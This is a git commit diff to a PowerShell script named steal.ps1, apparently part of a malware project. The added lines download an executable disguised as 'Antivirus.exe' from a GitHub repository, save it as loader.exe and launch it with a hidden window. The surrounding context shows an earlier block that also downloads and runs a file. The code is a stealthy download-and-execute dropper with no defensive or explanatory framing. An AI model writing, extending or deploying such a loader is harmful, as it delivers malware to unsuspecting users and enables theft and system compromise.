82757f36cab3e2acd0679533fabc75287d0a2295
43a1723 <hai1723notgay@gmail.com>
2024-09-02 19:41:48 +0700

    Update steal.ps1

--- scr/steal.ps1
+++ scr/steal.ps1
@@ -52,3 +52,13 @@ if (Test-Path -Path $output) {
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process -FilePath $output
 }
+
+$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
+$output = "$dir\loader.exe"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -WindowStyle Hidden -FilePath $output
+}
